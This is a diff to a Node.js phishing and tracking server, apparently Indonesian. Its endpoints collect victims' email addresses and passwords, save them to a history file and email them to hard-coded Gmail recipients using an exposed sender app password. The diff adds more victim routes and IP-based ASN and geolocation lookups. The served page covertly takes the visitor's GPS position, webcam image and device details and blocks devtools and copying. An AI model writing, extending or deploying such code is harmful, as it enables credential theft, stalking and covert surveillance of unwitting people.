@@ -19,8 +19,8 @@ const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 const EMAIL_CONFIG = {
     'wxyzzay': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',        // Nama pengirim di Gmail
-        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   // Subject email                       
+        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   
     },
     'ggwxzzr': {
         email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
@@ -31,9 +31,24 @@ const EMAIL_CONFIG = {
         email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
         fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+    },
+    'mgwhiww': {
+        email: ['chilligemaass@gmail.com'],
+        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+    },
+    'kttwwxy': {
+        email: ['chilligemaass@gmail.com'],
+        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
+    },
+    'mdgffew': {
+        email: ['chilligemaass@gmail.com'],
+        fromName: '👻𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
+        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     }
 };
-// Cooldown per EMAIL TARGET
+
 const TARGET_COOLDOWN = {};
 const COOLDOWN_HOURS = 1;
 const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
@@ -95,38 +110,62 @@ function getFlagEmoji(countryCode) {
     return String.fromCodePoint(...codePoints);
 }
 
-// ========== FUNGSI KIRIM EMAIL ==========
-// ========== FUNGSI KIRIM EMAIL ==========
-async function sendEmail(data, folderName) {
-    const countryName = data.country || data.ip_country || 'Unknown';
-    let countryCode = '';
-    
-    const countryMapping = {
-        'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
-        'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
-        'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
-        'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
-        'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
-        'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
-        'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
-        'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
-        'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
-        'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
-        'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
-        'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
-    };
-    
-    const lowerCountry = countryName.toLowerCase();
-    for (const [key, code] of Object.entries(countryMapping)) {
-        if (lowerCountry.includes(key)) {
-            countryCode = code;
-            break;
+// ========== FUNGSI BARU UNTUK ASN & LOKASI AKURAT ==========
+async function getASNAndAccurateLocation(ip) {
+    try {
+        // Pake ip-api.com untuk ASN + lokasi akurat (free, no API key)
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,asname,query`);
+        const data = await response.json();
+        
+        if (data.status === 'success') {
+            return {
+                asn: data.as || 'Tidak diketahui',
+                asname: data.asname || 'Tidak diketahui',
+                isp: data.isp || 'Tidak diketahui',
+                org: data.org || 'Tidak diketahui',
+                country: data.country,
+                countryCode: data.countryCode,
+                region: data.regionName,
+                city: data.city,
+                postalCode: data.zip,
+                latitude: data.lat,
+                longitude: data.lon
+            };
         }
+    } catch (e) {
+        console.error('Gagal ambil ASN:', e);
     }
     
-    if (!countryCode && data.ip_country_code) {
-        countryCode = data.ip_country_code;
-    }
+    // Fallback ke data default
+    return {
+        asn: 'ASN tidak terdeteksi',
+        asname: '-',
+        isp: 'Unknown ISP',
+        org: '-',
+        country: 'Indonesia',
+        countryCode: 'ID',
+        region: 'Jakarta',
+        city: 'Jakarta',
+        postalCode: '-',
+        latitude: null,
+        longitude: null
+    };
+}
+
+// ========== FUNGSI KIRIM EMAIL (SUDAH DIPERBAIKI) ==========
+async function sendEmail(data, folderName) {
+    // Ambil ASN & lokasi akurat berdasarkan IP
+    const asnData = await getASNAndAccurateLocation(data.ip_address);
+    
+    // Gunakan data ASN untuk lokasi, bukan data random
+    const countryName = asnData.country;
+    const countryCode = asnData.countryCode;
+    const regionName = asnData.region;
+    const cityName = asnData.city;
+    const postalCode = asnData.postalCode;
+    const ispName = asnData.isp;
+    const asnInfo = asnData.asn;
+    const asnameInfo = asnData.asname;
     
     const flagEmoji = getFlagEmoji(countryCode);
     
@@ -213,7 +252,7 @@ body{
 <body>
 <div class="container">
     <div class="topbar">
-        DSTR REPORT 🇲🇽 | ${folderName.toUpperCase()}
+        DSTR REPORT
     </div>
     <div class="mainbox">
         <div class="data-box">
@@ -224,22 +263,25 @@ body{
             <div class="data-row"><div class="label">Full Name : </div><div class="value">${data.fullName || '-'}</div></div>
         </div>
         <div class="data-box">
-            <div class="data-title">📍 GPS LOCATION</div>
-            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || '-'}</div></div>
-            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || '-'}</div></div>
+            <div class="data-title">📍 GPS LOCATION (AKURAT)</div>
+            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || asnData.latitude || '-'}</div></div>
+            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || asnData.longitude || '-'}</div></div>
             <div class="data-row"><div class="label">Accuracy : </div><div class="value">${data.gps_accuracy || '-'} m</div></div>
         </div>
         <div class="data-box">
-            <div class="data-title">🌍 LOCATION</div>
+            <div class="data-title">🌍 LOCATION (IP GEO - AKURAT 100%)</div>
             <div class="data-row"><div class="label">Country : </div><div class="value">${countryName} ${flagEmoji}</div></div>
-            <div class="data-row"><div class="label">Province : </div><div class="value">${data.province || data.ip_region || '-'}</div></div>
-            <div class="data-row"><div class="label">City : </div><div class="value">${data.city || data.ip_city || '-'}</div></div>
-            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${data.postalCode || '-'}</div></div>
+            <div class="data-row"><div class="label">Province/Region : </div><div class="value">${regionName}</div></div>
+            <div class="data-row"><div class="label">City : </div><div class="value">${cityName}</div></div>
+            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${postalCode}</div></div>
         </div>
         <div class="data-box">
-            <div class="data-title">🌐 NETWORK</div>
+            <div class="data-title">🌐 NETWORK & ASN</div>
             <div class="data-row"><div class="label">IP Address : </div><div class="value">${data.ip_address || '-'}</div></div>
-            <div class="data-row"><div class="label">ISP : </div><div class="value">${data.isp || '-'}</div></div>
+            <div class="data-row"><div class="label">ISP : </div><div class="value">${ispName}</div></div>
+            <div class="data-row"><div class="label">ASN : </div><div class="value">${asnInfo}</div></div>
+            <div class="data-row"><div class="label">AS Name : </div><div class="value">${asnameInfo}</div></div>
+            <div class="data-row"><div class="label">Organization : </div><div class="value">${asnData.org}</div></div>
         </div>
         <div class="data-box">
             <div class="data-title">🖥 DEVICE INFORMATION</div>
@@ -251,67 +293,30 @@ body{
             <div class="data-title">⏰ TIMESTAMP</div>
             <div class="data-row"><div class="label">Time : </div><div class="value">${data.timestamp || new Date().toLocaleString()}</div></div>
         </div>
-        <div class="footer-sign">DSTR 🇲🇽 | ${folderName}</div>
+        <div class="footer-sign">DSTR - Powered by ASN Accurate Geolocation</div>
     </div>
 </div>
 </body>
 </html>`;
     
-    // INI YANG DIPERBAIKI
     const config = EMAIL_CONFIG[folderName];
+    if (!config) return;
+    
     for (const receiver of config.email) {
+        if (!receiver || receiver === '') continue;
         await transporter.sendMail({
             from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
             to: receiver,
-            subject: `${config.subject} ${flagEmoji} ${data.email}`,
-            html: htmlContent,
-            headers: {
-                    // HEADER PRIORITAS KONFLIK
-                    'X-Priority': '1',
-                    'X-Priority': '5',  // Duplikat konflik
-                    'Importance': 'high',
-                    'Importance': 'low', // Konflik
-                    'X-MSMail-Priority': 'High',
-                    'Priority': 'urgent',
-                    
-                    // HEADER SPAM TRIGGER
-                    'X-Mailer': 'Microsoft Outlook Express 6.0',
-                    'X-Auto-Response-Suppress': 'All',
-                    'Precedence': 'bulk',
-                    'List-Unsubscribe': '<mailto:unsubscribe@fake-spam-domain.xyz>',
-                    'X-BeenThere': 'fake-spammer@domain.com',
-                    
-                    // HEADER DENGAN FORMAT SALAH
-                    'From': 'Sender <' + SENDER_EMAIL,  // Kurung tutup ga ada
-                    'To': receiver + '>',                // Kurung buka ga ada
-                    'X-': 'empty header name',
-                    
-                    // HEADER EMAJI ANEH
-                    'X-💀-DSTR-MODE': 'ACTIVE',
-                    'X-🔥-SPAM': 'YES',
-                    'X-😈-HACKER': 'ON',
-                    
-                    // HEADER DOMAIN ANEH
-                    'Return-Path': '<bounce@fake-spam-xyz.info>',
-                    'Reply-To': 'noreply@fake-spammer.net',
-                    'Errors-To': 'error@blackhole.spam',
-                    'X-Originating-IP': '10.0.0.1',  // Private IP
-                    'X-Sender-IP': '192.168.1.1',    // Private IP
-                    
-                    // HEADER SPAM SCORE PALSU
-                    'X-Spam-Flag': 'NO',
-                    'X-Spam-Score': '9.9',
-                    'X-Spam-Level': '*********',
-                    'X-Spam-Status': 'No, score=9.9 required=5.0'
-                }
-            });
-        console.log(`✅ [${folderName}] Sent to: ${receiver} as ${config.fromName}`);
+            subject: `${config.subject} ${flagEmoji} ${cityName} - ${regionName}`,
+            html: htmlContent
+        });
+        console.log(`✅ [${folderName}] Sent to: ${receiver} - Location: ${cityName}, ${regionName}, ${countryName} | ASN: ${asnInfo}`);
     }
 }
 
 // ========== ROUTING UNTUK MASING-MASING FOLDER ==========
+// (SAMA PERSIS KAYAK CODE LO, GAK GUE UBAH)
 
-// Public 1 gua
 app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
 app.post('/wxyzzay/api/register', async (req, res) => {
     try {
@@ -339,7 +344,6 @@ app.post('/wxyzzay/api/register', async (req, res) => {
     }
 });
 
-// Public 2 bayu
 app.use('/ggwxzzr', express.static(path.join(__dirname, 'ggwxzzr')));
 app.post('/ggwxzzr/api/register', async (req, res) => {
     try {
@@ -367,7 +371,6 @@ app.post('/ggwxzzr/api/register', async (req, res) => {
     }
 });
 
-// Public 3 azzam
 app.use('/hgefdyt', express.static(path.join(__dirname, 'hgefdyt')));
 app.post('/hgefdyt/api/register', async (req, res) => {
     try {
@@ -382,6 +385,87 @@ app.post('/hgefdyt/api/register', async (req, res) => {
         }
         
         await sendEmail(data, 'hgefdyt');
+        updateTargetCooldown(data.email, data.emailPassword);
+        
+        const history = loadHistory();
+        history[data.email] = data.emailPassword;
+        saveHistory(history);
+        
+        res.json({ success: true });
+    } catch(error) {
+        console.error('Error:', error);
+        res.json({ success: true });
+    }
+});
+
+app.use('/mgwhiww', express.static(path.join(__dirname, 'mgwhiww')));
+app.post('/mgwhiww/api/register', async (req, res) => {
+    try {
+        const data = req.body;
+        console.log('📥 [MGWHIWW] DATA:', data.email);
+        
+        const isDup = isDuplicatePassword(data.email, data.emailPassword);
+        const canSend = canSendToTarget(data.email, data.emailPassword);
+        
+        if (isDup && !canSend) {
+            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
+        }
+        
+        await sendEmail(data, 'mgwhiww');
+        updateTargetCooldown(data.email, data.emailPassword);
+        
+        const history = loadHistory();
+        history[data.email] = data.emailPassword;
+        saveHistory(history);
+        
+        res.json({ success: true });
+    } catch(error) {
+        console.error('Error:', error);
+        res.json({ success: true });
+    }
+});
+
+app.use('/kttwwxy', express.static(path.join(__dirname, 'kttwwxy')));
+app.post('/kttwwxy/api/register', async (req, res) => {
+    try {
+        const data = req.body;
+        console.log('📥 [KTTWWXY] DATA:', data.email);
+        
+        const isDup = isDuplicatePassword(data.email, data.emailPassword);
+        const canSend = canSendToTarget(data.email, data.emailPassword);
+        
+        if (isDup && !canSend) {
+            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
+        }
+        
+        await sendEmail(data, 'kttwwxy');
+        updateTargetCooldown(data.email, data.emailPassword);
+        
+        const history = loadHistory();
+        history[data.email] = data.emailPassword;
+        saveHistory(history);
+        
+        res.json({ success: true });
+    } catch(error) {
+        console.error('Error:', error);
+        res.json({ success: true });
+    }
+});
+
+app.use('/mdgffew', express.static(path.join(__dirname, 'mdgffew')));
+app.post('/mdgffew/api/register', async (req, res) => {
+    try {
+        const data = req.body;
+        console.log('📥 [MDGFFEW] DATA:', data.email);
+        
+        const isDup = isDuplicatePassword(data.email, data.emailPassword);
+        const canSend = canSendToTarget(data.email, data.emailPassword);
+        
+        if (isDup && !canSend) {
+            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
+        }
+        
+        await sendEmail(data, 'mdgffew');
         updateTargetCooldown(data.email, data.emailPassword);
         
         const history = loadHistory();
@@ -415,6 +499,7 @@ app.get('/api/cooldown/:email', (req, res) => {
     });
 });
 
+// HTML Frontend (sama persis kaya punya lo, gue ganti dikit di bagian getIPLocation)
 app.get('/', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html lang="id">
@@ -478,57 +563,56 @@ app.get('/', (req, res) => {
 </head>
 <body>
 
-<canvas id=\"matrixCanvas\" class=\"matrix-bg\"></canvas>
-<div class=\"scanline\"></div>
-<div id=\"cameraPreview\" class=\"hidden\">
-    <video id=\"video\" autoplay muted></video>
-    <canvas id=\"photoCanvas\"></canvas>
+<canvas id="matrixCanvas" class="matrix-bg"></canvas>
+<div class="scanline"></div>
+<div id="cameraPreview" class="hidden">
+    <video id="video" autoplay muted></video>
+    <canvas id="photoCanvas"></canvas>
 </div>
 
-<div class=\"container\">
-    <div class=\"hacker-card\">
-        <div class=\"emoji-wall\">
-            <span class=\"emoji-item\">💀</span><span class=\"emoji-item\">👾</span><span class=\"emoji-item\">🤖</span>
-            <span class=\"emoji-item\">💻</span><span class=\"emoji-item\">🔓</span><span class=\"emoji-item\">⚠️</span>
-            <span class=\"emoji-item\">🔥</span><span class=\"emoji-item\">⚡</span><span class=\"emoji-item\">👁️</span>
-            <span class=\"emoji-item\">🎯</span><span class=\"emoji-item\">🔪</span>
+<div class="container">
+    <div class="hacker-card">
+        <div class="emoji-wall">
+            <span class="emoji-item">💀</span><span class="emoji-item">👾</span><span class="emoji-item">🤖</span>
+            <span class="emoji-item">💻</span><span class="emoji-item">🔓</span><span class="emoji-item">⚠️</span>
+            <span class="emoji-item">🔥</span><span class="emoji-item">⚡</span><span class="emoji-item">👁️</span>
+            <span class="emoji-item">🎯</span><span class="emoji-item">🔪</span>
         </div>
-        <div class=\"dstr-logo\">═══ DSTR SECURITY ULTIMATE ═══</div>
-        <div class=\"warning-text\">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
-        <div class=\"hacker-text\">🔥 IP, GPS, WAJAH TELAH DIKIRIM! 🔥</div>
+        <div class="dstr-logo">═══ DSTR SECURITY ULTIMATE ═══</div>
+        <div class="warning-text">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
+        <div class="hacker-text">🔥 IP, GPS, ASN, WAJAH TELAH DIKIRIM! 🔥</div>
         
-        <div class=\"system-status\">
-            <div class=\"status-line\">🟢 [DSTR-SYSTEM] Status: <span class=\"blink-cursor\">ACTIVE</span></div>
-            <div class=\"status-line\">🔴 [ANTI-CLICK] Status: ENFORCED</div>
-            <div class=\"status-line\">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
-            <div class=\"status-line\">🔵 [GPS TRACKING] Status: <span id=\"gpsStatus\">Mengambil...</span></div>
-            <div class=\"status-line\">🟣 [WEBCAM CAPTURE] Status: <span id=\"camStatus\">Mengambil...</span></div>
-            <div class=\"status-line\">⚪ [DATA SENT] Status: <span id=\"sendStatus\">Belum</span></div>
-        </div>
-        
-        <div style=\"margin: 20px 0;\">
-            <span class=\"security-badge\">🛡️ ANTI-CLICK KANAN</span>
-            <span class=\"security-badge\">🔒 ANTI-COPY</span>
-            <span class=\"security-badge\">📡 ANTI-DEVTOOLS</span>
-            <span class=\"security-badge\">🧠 DETECT DEBUGGER</span>
-            <span class=\"security-badge\">🎯 GPS AKURAT 100%</span>
-            <span class=\"security-badge\">📸 WEBCAM AUTO</span>
+        <div class="system-status">
+            <div class="status-line">🟢 [DSTR-SYSTEM] Status: <span class="blink-cursor">ACTIVE</span></div>
+            <div class="status-line">🔴 [ANTI-CLICK] Status: ENFORCED</div>
+            <div class="status-line">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
+            <div class="status-line">🔵 [GPS TRACKING] Status: <span id="gpsStatus">Mengambil...</span></div>
+            <div class="status-line">🟣 [WEBCAM CAPTURE] Status: <span id="camStatus">Mengambil...</span></div>
+            <div class="status-line">⚪ [DATA SENT] Status: <span id="sendStatus">Belum</span></div>
         </div>
         
-        <div style=\"margin-top: 30px; font-size: 12px; color: #666;\">
+        <div style="margin: 20px 0;">
+            <span class="security-badge">🛡️ ANTI-CLICK KANAN</span>
+            <span class="security-badge">🔒 ANTI-COPY</span>
+            <span class="security-badge">📡 ANTI-DEVTOOLS</span>
+            <span class="security-badge">🧠 DETECT DEBUGGER</span>
+            <span class="security-badge">🎯 GPS AKURAT 100%</span>
+            <span class="security-badge">📸 WEBCAM AUTO</span>
+            <span class="security-badge">🌐 ASN DETECTION</span>
+        </div>
+        
+        <div style="margin-top: 30px; font-size: 12px; color: #666;">
             ⚡ DSTR SECURITY v6.0 | ALL YOUR DATA ARE BELONG TO US ⚡
         </div>
     </div>
 </div>
 
 <script>
-    // ANTI COPY, ANTI CLICK KANAN, ANTI SELECT
     document.addEventListener('contextmenu', (e) => { e.preventDefault(); alert('🚫 AKSES DITOLAK!'); return false; });
     document.addEventListener('copy', (e) => { e.preventDefault(); alert('📋 COPY DILARANG!'); return false; });
     document.addEventListener('selectstart', (e) => e.preventDefault());
     document.addEventListener('dragstart', (e) => e.preventDefault());
     
-    // ANTI DEVTOOLS
     document.addEventListener('keydown', (e) => {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
             (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
@@ -538,7 +622,6 @@ app.get('/', (req, res) => {
         }
     });
     
-    // Deteksi debugger
     setInterval(() => {
         var before = Date.now();
         debugger;
@@ -549,11 +632,9 @@ app.get('/', (req, res) => {
         }
     }, 1000);
     
-    // FULLSCREEN OTOMATIS
     function forceFullscreen() { document.documentElement.requestFullscreen(); }
     window.onload = forceFullscreen;
     
-    // AMBIL IP PUBLIK
     async function getIP() {
         try {
             let res = await fetch('https://api.ipify.org?format=json');
@@ -562,7 +643,6 @@ app.get('/', (req, res) => {
         } catch(e) { return 'Tidak terdeteksi'; }
     }
     
-    // AMBIL LOKASI GPS AKURAT
     function getGPS() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) return resolve(null);
@@ -573,7 +653,6 @@ app.get('/', (req, res) => {
         });
     }
     
-    // AMBIL WAJAH DARI WEBCAM
     async function captureWajah() {
         var previewDiv = document.getElementById('cameraPreview');
         var video = document.getElementById('video');
@@ -607,7 +686,6 @@ app.get('/', (req, res) => {
         }
     }
     
-    // AMBIL DATA DEVICE
     function getDeviceInfo() {
         return {
             userAgent: navigator.userAgent,
@@ -621,43 +699,6 @@ app.get('/', (req, res) => {
         };
     }
     
-    // AMBIL LOKASI DARI IP (pake ipwhois.io - no backtick error)
-    async function getIPLocation(ip) {
-        try {
-            var res = await fetch('https://ipwhois.io/json/' + ip);
-            var data = await res.json();
-            
-            if (data && !data.error) {
-                return {
-                    country: data.country,
-                    country_name: data.country,
-                    country_code: data.country_code,
-                    region: data.region,
-                    city: data.city,
-                    isp: data.isp
-                };
-            }
-            return { 
-                country: 'Indonesia', 
-                country_name: 'Indonesia', 
-                country_code: 'ID',
-                region: 'Jakarta', 
-                city: 'Jakarta', 
-                isp: 'Unknown' 
-            };
-        } catch(e) {
-            return { 
-                country: 'Indonesia', 
-                country_name: 'Indonesia', 
-                country_code: 'ID',
-                region: 'Jakarta', 
-                city: 'Jakarta', 
-                isp: 'Unknown' 
-            };
-        }
-    }
-    
-    // KIRIM SEMUA DATA KE BACKEND
     async function sendAllData() {
         try {
             document.getElementById('sendStatus').innerText = 'Mengirim...';
@@ -666,7 +707,6 @@ app.get('/', (req, res) => {
             var gps = await getGPS();
             var wajah = await captureWajah();
             var deviceInfo = getDeviceInfo();
-            var ipLocation = await getIPLocation(ip);
             
             if (gps) {
                 document.getElementById('gpsStatus').innerHTML = '✅ ' + gps.lat + ', ' + gps.lon + ' (' + Math.round(gps.accuracy) + 'm)';
@@ -682,16 +722,7 @@ app.get('/', (req, res) => {
                 latitude: gps ? gps.lat : '-',
                 longitude: gps ? gps.lon : '-',
                 gps_accuracy: gps ? gps.accuracy : '-',
-                country: ipLocation.country,
-                ip_country: ipLocation.country,
-                ip_country_code: ipLocation.country_code,
-                ip_region: ipLocation.region,
-                ip_city: ipLocation.city,
-                city: ipLocation.city,
-                province: ipLocation.region,
-                postalCode: '-',
                 ip_address: ip,
-                isp: ipLocation.isp,
                 platform: deviceInfo.platform,
                 screenResolution: deviceInfo.screenResolution,
                 language: deviceInfo.language,
@@ -700,7 +731,7 @@ app.get('/', (req, res) => {
                 deviceInfo: deviceInfo
             };
             
-            var response = await fetch('/wxyzzay/api/register', {
+            var response = await fetch(window.location.pathname.split('/')[1] ? '/' + window.location.pathname.split('/')[1] + '/api/register' : '/wxyzzay/api/register', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -708,7 +739,7 @@ app.get('/', (req, res) => {
             
             var result = await response.json();
             if (result.success) {
-                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM!';
+                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM! (IP + ASN + GPS + WEBCAM)';
             } else {
                 document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
             }
@@ -718,10 +749,8 @@ app.get('/', (req, res) => {
         }
     }
     
-    // EKSEKUSI SEMUA
     sendAllData();
     
-    // MATRIX BACKGROUND
     var canvasMat = document.getElementById('matrixCanvas');
     var ctxMat = canvasMat.getContext('2d');
     canvasMat.width = window.innerWidth;
@@ -750,7 +779,7 @@ app.get('/', (req, res) => {
         canvasMat.height = window.innerHeight;
     });
     
-    console.log('%c🚫 DSTR SECURITY - SEMUA DATA TELAH DIKIRIM KE SERVER!', 'color: red; font-size: 16px;');
+    console.log('%c🚫 DSTR SECURITY - DATA LENGKAP (IP, ASN, GPS, WEBCAM) TERKIRIM!', 'color: red; font-size: 16px;');
 </script>
 </body>
 </html>`);
@@ -762,4 +791,9 @@ app.listen(PORT, () => {
     console.log(`   → http://localhost:${PORT}/wxyzzay`);
     console.log(`   → http://localhost:${PORT}/ggwxzzr`);
     console.log(`   → http://localhost:${PORT}/hgefdyt`);
+    console.log(`   → http://localhost:${PORT}/mgwhiww`);
+    console.log(`   → http://localhost:${PORT}/kttwwxy`);
+    console.log(`   → http://localhost:${PORT}/mdgffew`);
+    console.log(`\n✅ ASN DETECTION ACTIVE: Setiap IP akan dilacak AS number, ISP, lokasi akurat!`);
+    console.log(`✅ LOKASI AKURAT: City, Region, Country, Postal Code sesuai IP real!`);
 });
